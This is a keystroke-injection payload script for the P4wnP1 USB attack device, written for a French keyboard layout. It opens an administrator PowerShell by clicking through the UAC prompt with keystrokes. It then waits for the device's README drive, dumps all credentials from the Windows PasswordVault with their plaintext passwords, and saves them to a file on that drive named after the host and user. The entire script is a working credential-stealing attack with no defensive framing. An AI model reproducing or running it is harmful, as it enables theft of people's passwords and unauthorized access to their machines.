layout('fr')
typingSpeed(0,0)
press("GUI r")
delay(200)
type("powershell")
press("CTRL SHIFT ENTER")
delay(1000)
press("SHIFT TAB")
press("ENTER")
delay(3000)
type('$drivefound=$false\n')
type('while (-not $drivefound)\n')
type('{\n')
type('    try\n')
type('    {\n')
type('        $drive=Get-Volume -FileSystemLabel ')
layout('us') 
press("3")
layout('fr')
type ('README')
layout('us') 
press("3")
layout('fr')
type (' -ErrorAction Stop\n')
type('    }\n')
type('    catch \n')
type('    {\n')
type('        ')
layout('us') 
press("3")
layout('fr')
type ('Waiting for P4wnP1 drive')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('        sleep 1\n')
type('        continue\n')
type('    } \n')
type('    $dl=($drive.DriveLetter ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' Out-String)[0] +')
layout('us') 
press("3")
layout('fr')
type (':')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('    $drivefound=$true\n')
type('}\n')
type('$filename=$dl+')
layout('us') 
press("3")
layout('fr')
type ('\\')
layout('us') 
press("3")
layout('fr')
type ('+$env:COMPUTERNAME+')
layout('us') 
press("3")
layout('fr')
type ('_')
layout('us') 
press("3")
layout('fr')
type ('+$env:USERNAME+')
layout('us') 
press("3")
layout('fr')
type ('.txt')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('\n')
type('[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n')
type('$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n')
type('foreach ($c in $creds) {$c.RetrievePassword()}\n')
type('$creds ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' Format-List -Property Resource,UserName,Password ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' Out-File $filename\n')
type('exit\n')